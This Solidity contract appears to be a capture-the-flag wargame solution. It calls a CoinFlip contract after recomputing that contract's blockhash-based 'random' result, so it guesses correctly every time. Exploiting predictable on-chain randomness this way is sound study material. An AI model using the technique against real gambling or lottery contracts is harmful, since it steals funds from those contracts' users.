pragma solidity ^0.8.0;
import "./CoinFlip.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";


contract Flipper {
using SafeMath for uint256;

    CoinFlip  coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor (address _coinflip){
        coinFlipContract = CoinFlip(_coinflip);
    }

    function solveGame () public returns (bool ){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        return coinFlipContract.flip(side);

    }
}